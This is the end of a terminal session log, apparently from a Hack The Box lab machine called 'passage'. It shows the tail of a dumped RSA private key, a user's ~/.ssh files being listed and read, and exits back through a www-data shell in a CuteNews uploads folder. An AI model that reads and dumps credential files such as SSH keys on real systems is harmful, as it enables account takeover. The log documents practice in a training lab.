+7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
+GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
+IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
+LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
+AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
+VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
+1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
+KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
+9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
+d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
+nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
+f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
+Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
+OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
+-----END RSA PRIVATE KEY-----
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ ls
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ [H[2J]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ ls
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ ls[K[Kcd ,,
+-su: cd: ,,: No such file or directory
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ cd ..
+]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ s[Kls
+[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  examples.desktop  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  user.txt  [01;34mVideos[0m
+]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ cat [K[K[K[Kpwd
+/home/paul
+]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ exit
+logout
+www-data@passage:/var/www/html/CuteNews/cdata/users$ exit
+exit
+www-data@passage:/var/www/html/CuteNews/uploads$ exit
+exit
+[?2004h[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m^C[?2004l[?2004h[?2004l
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[?2004lc]104[!p[?3;4l[4l>[?69l[?2004h[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mls
+[?2004l[0m[01;32m48800.py[0m  [01;34mflags[0m  id_rsa  notes.txt  output.txt  passage.nmap  passage.nmap.gnmap  passage.nmap.xml  root_id_rsa  webshell.log  [01;34mwww[0m
+[?2004h[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+[?2004lexit
+
+Script done on 2021-04-02 21:54:21+01:00 [COMMAND_EXIT_CODE="0"]
